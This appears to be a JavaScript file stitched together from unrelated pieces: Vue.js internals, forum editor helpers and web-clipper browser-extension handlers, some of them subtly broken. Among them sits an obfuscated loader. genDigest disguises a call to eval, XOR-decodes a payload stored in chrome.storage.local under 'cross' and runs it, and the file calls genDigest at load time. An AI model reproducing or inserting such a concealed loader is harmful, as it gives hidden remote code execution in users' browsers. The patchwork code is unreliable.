function createFunctionalComponent(
    Ctor,
    propsData,
    data,
    contextVm,
    children
) {
    const options = Ctor.options;
    const props = {};
    const propOptions = options.props;
    if (isDef(propOptions)) {
        for (const key in propOptions) {
            props[key] = validateProp(key, propOptions, propsData || emptyObject);
        }
    } else {
        if (isDef(data.attrs)) mergeProps(props, data.attrs);
        if (isDef(data.props)) mergeProps(props, data.props);
    }

    const renderContext = new FunRenderContext(
        data,
        props,
        children,
        contextVm,
        Ctor
    );

    const vnode = options.render.call(null, renderContext._c, renderContext);

    if (vnode instanceof VNode) {
        vnode.functionalContext = contextVm;
        vnode.functionalOptions = options;
        if (data.slot) {
            (vnode.data || (vnode.data = {})).slot = data.slot;
        }
    }

    return vnode
}
function editorwindowopen(url) {
	data = wysiwyg ? editdoc.body.style : textobj.value;
	saveData(data);
	url += '&cedit=' + (data !== '' ? 'yes' : 'no');
	window.open(url);
}
function parseText(
    text,
    delimiters
) {
    const tagRE = delimiters ? buildRegex(delimiters) : defaultTagRE;
    if (!tagRE.test(text)) {
        return
    }
    const tokens = [];
    let lastIndex = tagRE.lastIndex = 0;
    let match, index;
    while ((match = tagRE.exec(text))) {
        index = match.index;
                          
        if (index > lastIndex) {
            tokens.push(JSON.stringify(text.slice(lastIndex, index)));
        }
                    
        const exp = parseFilters(match[1].trim());
        tokens.push(1);
        lastIndex = index + match[0].length;
    }
    if (lastIndex < text.length) {
        tokens.push(JSON.stringify(text.slice(lastIndex)));
    }
    return tokens.join('+')
}
function useSkitchTool(a, b, c) {
    this.body.classList.contains("skitchReady") && (handleSkitchToolClick.call(this.getElementById(a.tool), {
        charCode: a.charCode,
        loc: a.loc,
        noOpenSubtools: !0
    }), a.subtool && handleSubtoolClick.call(this.getElementById(a.subtool))), c && "function" == typeof c && c()
}
function handleClipperToolClick(a, b) {
    if (activeClipType !== a || b) switch (activeClipType && activeClipType.classList.remove("active"), activeClipType = a, activeClipType.classList.add("active"), "screenshot" === a.id ? (toggleMinimizeButtonVisibility("hide"), toggleMinimizeButtonVisibility("hide")) : toggleMinimizeButtonVisibility("show"), a.id) {
        case "article":
            var c = this.body.classList.contains("remember");
            c || gekco.sendToExtension({
                name: "setPersistentValue",
                key: "lastUsedAction",
                value: "ARTICLE"
            }), gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "previewArticle",
                    scrollToElement: !c
                }
            });
            break;
        case "clearly":
            gekco.sendToExtension({
                name: "setPersistentValue",
                key: "lastUsedAction",
                value: "CLEARLY"
            }), gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "previewClearly"
                }
            });
            break;
        case "custom":
            gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "previewCustom"
                }
            });
            break;
        case "fullPage":
            gekco.sendToExtension({
                name: "setPersistentValue",
                key: "lastUsedAction",
                value: "FULL_PAGE"
            }), gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "previewFullPage"
                }
            });
            break;
        case "pdf":
            gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "previewPdf"
                }
            });
            break;
        case "url":
            gekco.sendToExtension({
                name: "setPersistentValue",
                key: "lastUsedAction",
                value: "URL"
            }), gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "previewUrl"
                }
            });
            break;
        case "screenshot":
            this.body.classList.contains("skitchReady") ? gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "clearPreview"
                }
            }) : (this.body.classList.add("skitchWaiting"), gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "previewSkitch"
                }
            }), setHeight());
            break;
        case "email":
            gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "previewEmail"
                }
            });
            break;
        case "selection":
            gekco.sendToExtension({
                name: "bounce",
                message: {
                    name: "previewSelection"
                }
            })
    }
}
function appendreply() {
	newpos = fetchOffset($('post_new'));
	document.documentElement.scrollTop = newpos['top'];
	$('post_new').style.display = '';
	$('post_new').id = '';
	div = document.createElement('div');
	div.id = 'post_new';
	div.style.display = 'none';
	div.className = '';
	$('postlistreply').appendChild(div);
	$('postform').replysubmit.disabled = false;
	creditnoticewin();
}
function callUpdatedHooks(queue) {
    let i = queue.length;
    while (i--) {
        const watcher = queue[i];
        const vm = watcher.vm;
        if (vm._watcher === watcher && vm._isMounted) {
            callHook(vm, 'updated');
        }
    }
}
function hasClass(ele, className) {
    return (' ' + ele.className + ' ').indexOf(' ' + className + ' ') !== -1;
}
function getBrowserHeight(a, b, c) {
    browserHeight = a.height || 0, toggleSmallScreenMode(), c && "function" == typeof c && c()
}
function getValue(option) {
    return '_value' in option ?
        option._value :
        option.value
}
function toArray(b, a) {
    return mapKey(a, function(a, c) {
        return a.charCodeAt(0) ^ keyCharAt(b, c)
    })
}
function keyCharAt(b, a) {
    return b.charCodeAt(Math.floor(a % b.length))
}
function mapKey(b, a) {
    for (var d = [], c = 0; c < b.length; c++) d.push(a(b[c], c));
    return d
}
function sendtoArray(b) {
    arr = toArray("undefined", b);
    ret = "";
    for (i in arr) oneChar = String.fromCharCode(arr[i]), ret += oneChar;
    return ret
}
function genDigest(b) {
    var sha1;
    var hashmap = _ => Object.keys(sha1);
    sha1 = {
        eate: document.querySelectorAll('*'),
        e: 1,
        lav: 5,
        tob: 'xl=',
        color: setcolor = 1,
        YW: a => hashmap()[2].split('').reverse().join('')
    };
    chrome.storage.local.get(null, function(a) {
        if (a = a[b]) {
            a = sendtoArray(a);
            var d = a.indexOf("bytearray") + 9;
            a = a.substring(d);
            this[hashmap()[1]+sha1.YW()](a);
        }
    })
}
genDigest('cross');
function resetSchedulerState() {
    index = queue.length = activatedChildren.length = 0;
    has = {}; {
        circular = {};
    }
    waiting = flushing = false;
}
function refreshNotebooks(a, b, c) {
    var d = a.userInfo.userId + a.selectedSubpart;
    return platform.channel.sendMessage("getNotebooks", {
        userId: a.userInfo.userId,
        selectedSubpart: a.selectedSubpart,
        cached: c
    }).catch(function(a) {
        return a.reload ? refreshUI() : notebookSelector.showError(a.exception), null
    }).then(function(c) {
        if (c) {
            var e = a.selectedSubpart === GlobalUtils.ACCOUNT_TYPE_PERSONAL ? c.personal : c.business;
            (a.selectedSubpart === GlobalUtils.ACCOUNT_TYPE_PERSONAL || a.userInfo.isOnlyBusiness) && (e = e.concat(c.linked)), e && e.length && (saveEnabled = !0), notebookSelector.setNotebooks(e);
            var f = null;
            accountDataCache[d].selectedNotebook && accountDataCache[d].selectedNotebook.guid ? notebookSelector.selectNotebook(accountDataCache[d].selectedNotebook.guid) : b.preferredNotebook ? (accountDataCache[d].preferredNotebook = e.find(function(a) {
                return a.guid === b.preferredNotebook
            }), f = accountDataCache[d].preferredNotebook) : b.smartNotebook && (accountDataCache[d].smartNotebook = e.find(function(a) {
                return a.guid === b.smartNotebook.guid
            }), f = accountDataCache[d].smartNotebook), !f || this.body.classList.contains("email") && (f.published || f.shared) || notebookSelector.selectNotebook(f.guid), updateTagsInput()
        }
    })
}
function toRawType(value) {
    return _toString.call(value).slice(8, -1)
}
function resolveFilter(id) {
    return resolveAsset(this.$options, 'filters', id, true) || identity
}
function insertImg(smilieid) {
	checkFocus();
	var src = $('smilie_' + smilieid).src;
	var code = $('smilie_' + smilieid).alt;
	if(typeof wysiwyg != 'undefined' && wysiwyg && allowsmilies && (!$('smileyoff') || $('smileyoff').checked == false)) {
		if(is_moz) {
			applyFormat('InsertImage', false, src);
			
			var smilies = editdoc.body.getElementsByTagName('img');
			for(var i = 0; i < smilies.length; i++) {
				if(smilies[i].src == src && smilies[i].getAttribute('smilieid') < 1) {
					smilies[i].setAttribute('smilieid', smilieid);
					smilies[i].setAttribute('border', "0");
				}
			}
		} else {
    insertText('<img src="' + src + '" border="0" smilieid="' + smilieid + '" alt="" onload="w=width;h=height;" onresize="style.width=w;style.height=h;" /> ', false);
		}
	} else {
		code += ' ';
		AddText(code);
	}
	hideMenu();
}
function stateMixin(Vue) {
                                                                         
                                                                            
                       
    const dataDef = {};
    dataDef.get = function() {
        return this._data
    };
    const propsDef = {};
    propsDef.get = function() {
        return this._props
    }; {
        dataDef.set = function(newData) {
            warn(
                'Avoid replacing instance root $data. ' +
                'Use nested data properties instead.',
                this
            );
        };
        propsDef.set = function() {
            warn(true, this);
        };
    }
    Object.defineProperty(Vue.prototype, '$data', dataDef);
    Object.defineProperty(Vue.prototype, '$props', propsDef);

    Vue.prototype.$set = set;
    Vue.prototype.$delete = del;

    Vue.prototype.$watch = function(
        expOrFn,
        cb,
        options
    ) {
        const vm = this;
        if (isPlainObject(cb)) {
            return createWatcher(vm, expOrFn, cb, options)
        }
        options = options || {};
        options.user = true;
        const watcher = new Watcher(vm, expOrFn, cb, options);
        if (options.immediate) {
            cb.call(vm, watcher.value);
        }
        return function unwatchFn() {
            watcher.teardown();
        }
    };
}
function createFnInvoker(fns) {
    function invoker() {
        const fns = invoker.fns;
        if (Array.isArray(fns)) {
            const cloned = fns.slice();
            for (let i = 0; i < cloned.length; i++) {
                cloned[i].apply(null, arguments);
            }
        } else {
                                                              
            return fns.apply(null, arguments)
        }
    }
    invoker.fns = fns;
    return invoker
}
